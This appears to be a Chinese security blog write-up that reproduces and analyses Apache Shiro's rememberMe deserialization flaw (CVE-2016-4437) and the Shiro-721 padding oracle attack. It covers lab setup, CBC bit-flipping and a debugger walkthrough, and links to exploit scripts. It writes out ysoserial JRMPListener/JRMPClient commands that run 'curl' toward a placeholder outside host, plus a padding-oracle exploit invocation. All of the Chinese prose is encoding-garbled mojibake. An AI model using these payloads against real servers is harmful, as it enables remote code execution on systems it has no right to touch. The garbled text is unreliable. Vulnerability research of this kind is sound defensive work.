target="_blank" rel="noopener">CBCå­—èŠ‚ç¿»è½¬æ”»å‡»-101Approach</a>ï¼Œ<br>å†æ¥å‚è€ƒ<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/" target="_blank" rel="noopener">ctfwikiä¸­å¯¹CBCæ¨¡å¼çš„ä»‹ç»</a>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293334.jpg" alt="-w852"><br>ç®€å•æ¥è¯´ï¼Œé€šè¿‡æ„é€ ç¬¬nçš„å¯†æ–‡å—ä¸º<code>C(n) xor P(n+1) xor A</code>ï¼Œä½¿å¾—ç¬¬n+1å¯†æ–‡å—ä¸ºA(ä¸ªäººè§‰å¾—CTFWikiè¿™é‡Œå†™é”™äº†)ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p><code>C(n) xor P(n+1)</code>çš„ç»“æœå®é™…ä¸Šå°±æ˜¯ç¬¬n+1ç»„çš„<code>intermediary value</code>ï¼Œåœ¨è§£å¯†æ—¶è®©<code>intermediary value</code>è‡ªå·±å¼‚æˆ–è‡ªå·±å¾—å…¨0ï¼Œç„¶åå†å¼‚æˆ–Aå¾—Aã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293342.jpg" alt=""></p><p>ç®€è€Œè¨€ä¹‹ï¼Œé€šè¿‡æŸåå¯†æ–‡å­—èŠ‚æ¥æ”¹å˜æ˜æ–‡å­—èŠ‚ï¼Œæ”»å‡»æ¡ä»¶ä¸ºçŸ¥é“ä¸€ç»„æ˜æ–‡å’Œå¯†æ–‡ã€‚</p><h2 id="CVE-2016-4437-Shiro-ååºåˆ—åŒ–-Shiro-lt-1-2-4"><a href="#CVE-2016-4437-Shiro-ååºåˆ—åŒ–-Shiro-lt-1-2-4" class="headerlink" title="CVE-2016-4437: Shiro ååºåˆ—åŒ–(Shiro &lt;= 1.2.4)"></a>CVE-2016-4437: Shiro ååºåˆ—åŒ–(Shiro &lt;= 1.2.4)</h2><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚åœ¨Apache Shiro &lt;= 1.2.4ç‰ˆæœ¬ä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å»githubä¸Šä¸‹ä¸€ä¸ª<a href="https://github.com/apache/shiro/archive/shiro-root-1.2.4.zip" target="_blank" rel="noopener">shiro 1.2.4</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure></p><p>ç„¶åä¿®æ”¹shiro/samples/web/pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  éœ€è¦è®¾ç½®ç¼–è¯‘çš„ç‰ˆæœ¬ --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º1.2 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">    Â·   <span class="comment">&lt;!--åŠ ä¸€ä¸ªgadget--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç¼–è¯‘ï¼š<code>sudo mvn package</code></p><p>çˆ†äº†è¿™æ ·çš„é”™ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293349.jpg" alt="-w759"><br>å…ˆå¾—å»æä¸ªjdk1.6æ¥ï¼Œmacä¸‹å¼ƒç”¨äº†ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/q258523454/article/details/84029886ï¼Œå»è¿™é‡Œä¸‹[macçš„jdk1.6][6]ã€‚" target="_blank" rel="noopener">https://blog.csdn.net/q258523454/article/details/84029886ï¼Œå»è¿™é‡Œä¸‹[macçš„jdk1.6][6]ã€‚</a><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293356.jpg" alt="-w516"></p><p>ç„¶ååˆ‡æ¢åˆ°rootåˆ›ä¸€ä¸ªæ–‡ä»¶ï¼š/var/root/.m2/toolchains.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">toolchains</span> <span class="attr">xmlns</span>=<span class="string">"https://maven.apache.org/TOOLCHAINS/1.1.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"https://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"https://maven.apache.org/TOOLCHAINS/1.1.0 https://maven.apache.org/xsd/toolchains-1.1.0.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--æ’å…¥ä¸‹é¢ä»£ç --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">toolchain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>jdk<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provides</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">provides</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--è¿™é‡Œæ˜¯ä½ å®‰è£…jdkçš„æ–‡ä»¶ç›®å½•--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">jdkHome</span>&gt;</span>/Library/Java/JavaVirtualMachines/1.6.0.jdk/<span class="tag">&lt;/<span class="name">jdkHome</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">toolchain</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchains</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å†ç¼–è¯‘å°±èƒ½æˆåŠŸäº†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293366.jpg" alt="-w376"></p><p>å°†è¿™ä¸ªwaråŒ…æ”¾åˆ°tomcatçš„webappç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®<code>https://127.0.0.1:8080/shiro/</code>ä¼šè‡ªåŠ¨è§£å‹ï¼š<br><a href="media/15832217572390/samples-web-1.2.4.war">samples-web-1.2.4</a><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293374.jpg" alt="-w688"></p><p>ä¹Ÿå¯ä»¥æŠŠå®ƒå¯¼åˆ°ideaé‡Œæ‰“åŒ…ï¼Œæ¥ç€é…ç½®ideaï¼Œè¿™é‡Œè¸©äº†å‘EDUç‰ˆæœ¬æ˜¯æ²¡æœ‰tomcat serverçš„ï¼Œä¸€å®šè¦ç”¨æ——èˆ°ç‰ˆï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293382.jpg" alt="-w674"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293389.jpg" alt="-w1078"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293397.jpg" alt="-w870"></p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>EXPæ‰“ysoserialçš„äºŒé“¾ï¼š<a href="media/15832217572390/shiro1.2.4RCE.py">shiro1.2.4RCE</a><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293405.jpg" alt="-w683"></p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><h4 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h4><p>å…ˆä¸‹ä¸ªæ–­ç‚¹ï¼šorg.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLoginï¼Œå»login.jspç™»å½•root    secretï¼Œé€‰ä¸­Remember Meã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293417.jpg" alt="-w1235"><br>åœ¨<code>forgetIdentity</code>å‡½æ•°ä¸­å¤„ç†äº†requestå’Œresponseè¯·æ±‚ï¼Œåœ¨responseä¸­å¤„ç†remember meçš„cookieã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293425.jpg" alt="-w1315"><br>å†è·Ÿè¿›<code>rememberIdentity</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293433.jpg" alt="-w1234"><br>è°ƒç”¨<code>convertPrincipalsToBytes</code>å°†è´¦æˆ·ä¿¡æ¯ä¼ å…¥ï¼Œå…ˆæ˜¯è¿›è¡Œåºåˆ—åŒ–ï¼Œå†æ¥ä¸€ä¸ªåŠ å¯†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293440.jpg" alt="-w1107"><br>è·Ÿè¿›<code>encrypt</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293448.jpg" alt="-w1237"><br><code>getCipherService</code>å…ˆè·å–äº†ä¸€ä¸‹åŠ å¯†æœåŠ¡çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŠ å¯†æ¨¡å¼ï¼Œå¡«å……æ–¹å¼ï¼ŒåŠ å¯†ç±»å‹ç­‰ç­‰ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293459.jpg" alt="-w830"><br><code>cipherService.encrypt</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293467.jpg" alt="-w1077"><br>å…¶ä¸­ç§˜é’¥åœ¨AbstractRememberMeManager.javaä¸­è®¾ç½®çš„ä¸€ä¸ªå®šå€¼ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293475.jpg" alt="-w1220"><br>é€šè¿‡æ„é€ æ–¹æ³•è®¾ç½®çš„ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293482.jpg" alt="-w795"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293489.jpg" alt="-w690"></p><p>åœ¨åŠ å¯†è¿‡ç¨‹ä¸­éœ€è¦å…³æ³¨çš„ä¸€ä¸ªç‚¹ï¼Œå°†ivå‘é‡æ”¾ç½®åœ¨å¯†æ–‡å¤´éƒ¨ï¼šorg/apache/shiro/crypto/JcaCipherService.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293499.jpg" alt="-w1111"></p><p>åŠ å¯†å®Œæˆåï¼Œè¿”å›ç»“æœä¼ å…¥<code>rememberSerializedIdentity</code>å‡½æ•°ï¼Œå¤„ç†httpè¯·æ±‚ï¼Œè¿”å›cookieåˆ°responseä¸­ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293507.jpg" alt="-w1018"></p><p>åˆ°è¿™é‡ŒcookieåŠ å¯†å¤„ç†å°±ç»“æŸäº†ï¼Œå†æ¥è·Ÿä¸€ä¸‹æ˜¯å¦‚ä½•è§£å¯†cookieçš„ã€‚</p><h4 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h4><p>org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293516.jpg" alt="-w1083"><br>å…ˆä»<code>getRememberedSerializedIdentity</code>å‡½æ•°è·å–cookieï¼Œbase64è§£ç ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293524.jpg" alt="-w913"></p><p>ç„¶åè¿›å…¥<code>convertBytesToPrincipals</code>å‡½æ•°ï¼Œå…ˆæ˜¯è§£å¯†ï¼Œæ¥ç€ååºåˆ—åŒ–<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293532.jpg" alt="-w1183"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293540.jpg" alt="-w1107"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293550.jpg" alt="-w1031"></p><h3 id="å‘ç‚¹ï¼šååºåˆ—åŒ–é™åˆ¶"><a href="#å‘ç‚¹ï¼šååºåˆ—åŒ–é™åˆ¶" class="headerlink" title="å‘ç‚¹ï¼šååºåˆ—åŒ–é™åˆ¶"></a>å‘ç‚¹ï¼šååºåˆ—åŒ–é™åˆ¶</h3><p>ç½‘ä¸Šå¤§éƒ¨åˆ†æ–‡ç« éƒ½æ˜¯æ‹¿common-collections2è¿™è°ƒé“¾æ¥å¤ç°ï¼Œç•…é€šæ— é˜»ã€‚</p><p>æˆ‘ä»¬æ¥è¯•è¯•å…¶ä»–é“¾ï¼ŒæŠŠgadgetæ¢æˆysoserial5æ‰“shiroè‡ªå¸¦çš„<code>commons-collections-3.2.1</code>ï¼Œä¼šæŠ›å‡ºè¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293562.jpg" alt="-w1260"></p><p>å†æŠŠå…¶ç»„ä»¶æ‹‰å‡ºæ¥å•ç‹¬è¯•è¯•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293574.jpg" alt="-w1570"></p><p>è°ƒè¯•åˆ†æä¸€ä¸‹ï¼šorg/apache/shiro/io/DefaultSerializer.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293583.jpg" alt="-w977"><br>è·Ÿè¿›<code>ClassResolvingObjectInputStream</code>ç±»ï¼šorg/apache/shiro/io/ClassResolvingObjectInputStream.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293593.jpg" alt="-w1236"><br>ä»–ç»§æ‰¿äº†<code>ObjectInputStream</code>ç±»ï¼Œé‡å†™äº†<code>resolveClass</code>æ–¹æ³•ï¼Œå†æ¥çœ‹ä¸€ä¸‹åŸç‰ˆ<code>resolveClass</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293605.jpg" alt="-w1418"></p><p><code>Class.forName</code>å’Œ<code>ClassUtils.forName</code>çš„å·®åˆ«ï¼Œæ¥çœ‹çœ‹<code>ClassUtils</code>å…·ä½“å®ç°ï¼šorg/apache/shiro/util/ClassUtils.java#forName<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293613.jpg" alt="-w1175"><br>shiroä¸æ˜¯åƒåŸç‰ˆé‚£æ ·é€šè¿‡<code>java.lang.Class</code>åå°„è·å–classï¼Œè€Œæ˜¯é€šè¿‡<code>ParallelWebappClassLoader</code>å»åŠ è½½class<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293624.jpg" alt="-w1125"><br>æŸ¥äº†ä¸€äº›ä¸‹èµ„æ–™ï¼Œçœ‹åˆ°<a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">orangeå¸ˆå‚…æ–‡ç« </a>è¯„è®ºä¸­è¯´ä¸æ”¯æŒè£…è½½æ•°ç»„ç±»å‹ï¼Œè¿™é‡Œæ²¡ç»†è·ŸåŸå› äº†ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293632.jpg" alt="-w1206"></p><h4 id="JRMPç»•è¿‡"><a href="#JRMPç»•è¿‡" class="headerlink" title="JRMPç»•è¿‡"></a>JRMPç»•è¿‡</h4><p><a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">Orangå¸ˆå‚…åœ¨æ–‡ç« </a>ä¸­ä¸€é¡¿æ“ä½œï¼Œå‘ç°JRMPå¯ä»¥é¿å¼€ä¸Šè¿°é™åˆ¶ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š</p><p>serverï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl https://x.x.x.x:8989'</span><br></pre></td></tr></table></figure></p><p>client:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293639.jpg" alt="-w659"></p><p>ç¨å¾®è°ƒäº†ä¸€ä¸‹EXP,å¤§æ¦‚èƒ½è¡Œçš„åŸå› å°±æ˜¯èµ°çš„è¿œç¨‹çš„classåŠ è½½çš„ï¼Œè€Œä¸æ˜¯åƒä¹‹å‰é‚£æ ·ç›´æ¥æ‰“æœ¬åœ°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293652.jpg" alt="-w1507"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293663.jpg" alt="-w1239"></p><p>ä¸è¿‡æœ‰ä¸€ç‚¹æ¯”è¾ƒå›°æƒ‘ï¼Œç”¨URLDNSæ‰“äº†æ²¡ç»“æœï¼Œä½†æ˜¯ç›´æ¥ç”¨5é“¾JRMPæ‰“å´å¯ä»¥â€¦</p><blockquote><p>è¿™é‡Œæ‰‹åŠ¨è†œ@hu3skyå¸ˆå‚…ï¼Œæ•™æˆ‘æ‰‹æŒ–æ— æ•°ç»„çš„gadgets</p></blockquote><h3 id="æŒ–æ˜3-2-1æ— æ•°ç»„gadget"><a href="#æŒ–æ˜3-2-1æ— æ•°ç»„gadget" class="headerlink" title="æŒ–æ˜3.2.1æ— æ•°ç»„gadget"></a>æŒ–æ˜3.2.1æ— æ•°ç»„gadget</h3><blockquote><p>å…ˆæŒ–å‘ï¼ŒæŒ–åˆ°å†è¯´å§</p></blockquote><h2 id="Shiro-Padding-Oracleæ”»å‡»ï¼ˆShiro-lt-1-4-1ï¼‰"><a href="#Shiro-Padding-Oracleæ”»å‡»ï¼ˆShiro-lt-1-4-1ï¼‰" class="headerlink" title="Shiro Padding Oracleæ”»å‡»ï¼ˆShiro &lt;= 1.4.1ï¼‰"></a>Shiro Padding Oracleæ”»å‡»ï¼ˆShiro &lt;= 1.4.1ï¼‰</h2><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>EXPç”¨<a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">3ndz/Shiro-721</a>ï¼Œshiroçš„ç‰ˆæœ¬1.4.1é…ç½®è¿‡ç¨‹å‚è€ƒä¸Šæ–‡ã€‚</p><p>ysoç”Ÿæˆä¸ªjrmpclientï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos; &gt; JRMPClient</span><br></pre></td></tr></table></figure></p><p>æœåŠ¡ç«¯èµ·ä¸€ä¸ªjrmplistener<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 &apos;curl https://x.x.x.x:8989&apos;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_padding_oracle.py https://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMeçš„cookie] JRMPClien</span><br></pre></td></tr></table></figure><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293676.jpg" alt="-w1569"></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å…ˆæ¥çœ‹çœ‹è¿™ä¸ªç‰ˆæœ¬å¯¹ç§˜é’¥çš„å¤„ç†ï¼šorg/apache/shiro/mgt/AbstractRememberMeManager.java</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293684.jpg" alt="-w683"></p><p>ä¸€ç›´è·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°å°†ä¹‹å‰çš„ç¡¬ç¼–ç ç§˜é’¥æ¢æˆäº†åŠ¨æ€ç”Ÿæˆï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293693.jpg" alt="-w878"></p><h4 id="paddingé”™è¯¯"><a href="#paddingé”™è¯¯" class="headerlink" title="paddingé”™è¯¯"></a>paddingé”™è¯¯</h4><p>åœ¨æˆ‘ä»¬ç»™rememberMeè¾“å…¥é”™è¯¯çš„paddingåï¼Œç»è¿‡ä¸Šæ–‡æåˆ°çš„è§£å¯†è¿‡ç¨‹åï¼Œä¼šæŠ›å‡ºå¼‚å¸¸:/org/apache/shiro/crypto/JcaCipherService.class<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293705.jpg" alt="-w1309"><br>ç„¶ååœ¨org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipalsæ•è·<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293715.jpg" alt="-w1341"></p><p>æœ€ååœ¨org/apache/shiro/web/servlet/SimpleCookie.javaä¸­ç»™è¿”å›åŒ…è®¾ç½®ä¸€ä¸ªrememberMeçš„cookieï¼Œè¦†ç›–æ‰ä¹‹å‰çš„å€¼ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293727.jpg" alt="-w1179"></p><p>è°ƒç”¨æ ˆï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293736.jpg" alt="-w594"></p><h4 id="paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯"><a href="#paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯" class="headerlink" title="paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯"></a>paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯</h4><p>åœ¨ä¹‹å‰çš„padding oracleæ¼æ´ä¸­ï¼Œä¾é æ§åˆ¶å‰ä¸€å—å¯†æ–‡æ¥ä¼ªé€ åä¸€å—çš„æ˜æ–‡ï¼Œæ ¹æ®Paddingçš„æœºåˆ¶ï¼Œå¯æ„é€ å‡ºä¸€ä¸ªboolæ¡ä»¶ï¼Œä»è€Œé€ä½å¾—åˆ°æ˜æ–‡ï¼Œç„¶åé€å—å¾—åˆ°æ‰€æœ‰æ˜æ–‡ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´é€šè¿‡paddingè·å–æ¥ä¼ªé€ æ˜æ–‡çš„ï¼Œä¼šæ”¹å˜å‰ä¸€å—çš„å¯†æ–‡ï¼Œä¹Ÿå°±æ˜¯ä¼šå½±å“åˆ°è§£å¯†çš„ç»“æœã€‚æˆ‘ä»¬æ¥çœ‹shiroä¸­å¯¹äºè§£å¯†ç»“æœçš„å¤„ç†ï¼Œåœ¨DefaultSerializer.classä¸­è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šå¤±è´¥è€ŒæŠ›å‡ºå¼‚å¸¸ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293748.jpg" alt="-w1316"><br>è€Œå¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼Œç»“æœæ˜¯ä¸€æ ·çš„ï¼Œéƒ½èµ°åˆ°äº†AbstractRememberMeManager.javaçš„å¼‚å¸¸å¤„ç†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846058293759.jpg" alt="-w1187"><br>æ¥ç€å°±æ˜¯ç»™å®¢æˆ·ç«¯é‡ç½®rememberMeçš„cookieã€‚</p><h4 id="æ‹¼æ¥åºåˆ—åŒ–æ•°æ®"><a href="#æ‹¼æ¥åºåˆ—åŒ–æ•°æ®" class="headerlink" title="æ‹¼æ¥åºåˆ—åŒ–æ•°æ®"></a>æ‹¼æ¥åºåˆ—åŒ–æ•°æ®</h4><p>åœ¨<a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">gyyy:æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a>è¿™ç¯‡æ–‡ç« ä¸­ä»‹ç»äº†javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æœºåˆ¶ï¼Œå…³é”®ç‚¹åœ¨äºObjectOutputStreamæ˜¯ä¸€ä¸ªStreamï¼Œä»–ä¼šæŒ‰æ ¼å¼ä»¥é˜Ÿåˆ—æ–¹å¼è¯»ä¸‹å»ï¼Œåé¢æ‹¼æ¥æ— å…³å†…å®¹ï¼Œä¸ä¼šå½±å“ååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥ç°åœ¨BOOLæ¡ä»¶å°±å‡ºæ¥äº†ï¼Œæ‹¼æ¥æ— å…³æ•°æ®ï¼Œpadding æ­£ç¡®ï¼Œèƒ½æ­£å¸¸ååºåˆ—åŒ–ï¼Œpaddingé”™è¯¯æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>æœ€åpayloadçš„æ„é€ å°±æ˜¯ä¸æ–­çš„ç”¨ä¸¤ä¸ªblockå»paddingå¾—åˆ°intermediaryä¹‹åï¼Œæ„é€ å¯†æ–‡ä½¿å¾—è§£å¯†åå¾—åˆ°æŒ‡å®šæ˜æ–‡ï¼Œæœ€åæ‹¼æ¥åˆ°åŸæœ‰çš„cookieä¸Šã€‚</p><p>exp: <a 